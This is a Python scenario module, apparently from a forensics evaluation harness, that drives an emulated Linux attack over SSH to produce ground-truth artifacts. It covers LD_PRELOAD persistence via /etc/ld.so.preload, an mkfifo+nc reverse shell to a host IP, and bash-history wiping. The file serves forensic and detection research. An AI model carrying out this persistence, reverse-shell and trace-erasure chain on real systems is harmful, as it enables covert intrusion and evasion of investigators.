"""
orchestrator/attacks/scenario_01_ldpreload.py

Scenario 01 -- LD_PRELOAD infection via /etc/ld.so.preload

Attack narrative
----------------
The attacker gains initial SSH access as an unprivileged user.  They perform
system discovery, compile a malicious shared library that hooks getuid(3),
write it to /etc/ld.so.preload, then trigger the hook by spawning a new
process.  A reverse shell is established from inside that hooked process,
leaving the .so mapped in memory.  Cleanup optionally clears bash history.

Steps
-----
1. T1082        -- system info collection          (best-effort, not recorded)
2. T1574.006    -- compile .so + write /etc/ld.so.preload
3. custom       -- spawn process, verify hook active in /proc/<pid>/maps
4. T1059.004    -- mkfifo+nc reverse shell (leaves socket + .so in memory)
5. cleanup only when run_cleanup=True:
   - plant bash history so T1070.003 has a file to remove
   - T1070.003  -- rm ~/.bash_history
   - T1574.006 ART cleanup -- remove /etc/ld.so.preload + .so

Forensic artifacts
------------------
Disk:
  /etc/ld.so.preload   written by step 2; removed by cleanup
  /tmp/T1574006.so     compiled .so;      removed by cleanup
  ~/.bash_history      present if cleanup NOT run; absent if cleanup IS run

Memory:
  any process spawned after step 2 has /tmp/T1574006.so mapped
  reverse shell process: open TCP socket + /tmp/T1574006.so in maps

Ground-truth shape
------------------
The orchestrator pre-builds `ground_truth = {"scenario_id": ..., "steps": []}`
and passes it in. run() appends per-step dicts to ground_truth["steps"]; the
orchestrator persists the dict in a finally clause so partial runs survive a
mid-scenario exception.
"""

from __future__ import annotations
from functools import partial

from typing import Any

from orchestrator.attacks.art_runner import ArtRunner
from orchestrator.attacks.helpers import (
    ArtStep,
    plant_history,
    run_art_cleanup,
    run_art_step,
    run_reverse_shell,
)
from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient

# --- ART step descriptors -----------------------------------------------

_DISCOVERY = ArtStep(
    name="discovery",
    technique="T1082",
    guid="cccb070c-df86-4216-a5bc-9fb60c74e27c",  # List OS Information
)

_LDPRELOAD = ArtStep(
    name="ldpreload",
    technique="T1574.006",
    guid="39cb0e67-dd0d-4b74-a74b-c072db7ae991",  # /etc/ld.so.preload
    has_prereq=True,
)

_CLEANUP_HISTORY = ArtStep(
    name="cleanup_history",
    technique="T1070.003",
    guid="a934276e-2be5-4a36-93fd-98adbb5bd4fc",  # rm ~/.bash_history
)


# --- public entry point -------------------------------------------------


def run(
    ssh: SSHClient,
    runner: ArtRunner,
    host_ip: str,
    internet_on,
    internet_off,
    ground_truth: dict[str, Any],
    *,
    run_cleanup: bool = False,
) -> None:
    _step = partial(
        run_art_step, runner, internet_on=internet_on, internet_off=internet_off
    )
    steps = ground_truth["steps"]

    # Discovery (T1082) leaves no disk/memory artifact, so no spec in
    # artifact_specs.py covers it. Run it for narrative fidelity but keep it out
    # of ground_truth: the evaluator scores one report step per ground_truth
    # step, so ground_truth must mirror the spec step names exactly.
    console.step_header("[1/4] discovery")
    _step(_DISCOVERY)

    console.step_header("[2/4] LD_PRELOAD infection")
    steps.append(_step(_LDPRELOAD, raise_on_error=True))

    console.step_header("[3/4] LD_PRELOAD hook trigger")
    steps.append(_trigger_hook(ssh))

    console.step_header("[4/4] reverse shell")
    # keep_open=True leaves the socket ESTABLISHED with nc resident through
    # memory acquisition, so linux.sockstat recovers it (sockscan still backs
    # up the post-mortem CLOSE case when run with keep_open=False).
    run_reverse_shell(ssh, host_ip, steps, keep_open=True)

    if run_cleanup:
        console.step_header("cleanup")
        plant_history(ssh, steps)
        steps.append(run_art_step(runner, _CLEANUP_HISTORY))
        run_art_cleanup(runner, _LDPRELOAD, steps)
    else:
        # No cleanup step recorded: with run_cleanup=False the cleanup-phase
        # specs have nothing to match, so ground_truth carries only the attack
        # steps (ldpreload, ldpreload_trigger, reverse_shell).
        console.step_header("cleanup (skipped: artifacts preserved)")


# --- scenario-local helpers ---------------------------------------------


def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
    cmd = "sh -c 'sleep 300 >/dev/null 2>&1 & echo $!'"
    code, out, _ = ssh.run(cmd, timeout=10)
    pid = out.strip()
    code2, maps_out, _ = ssh.run(f"grep T1574006.so /proc/{pid}/maps", timeout=10)
    loaded = code2 == 0 and "T1574006.so" in maps_out
    return {
        "step": "ldpreload_trigger",
        "technique": "T1574.006",
        "exit_code": code,
        "trigger_pid": pid,
        "so_loaded": loaded,
        "maps_excerpt": maps_out.strip(),
    }
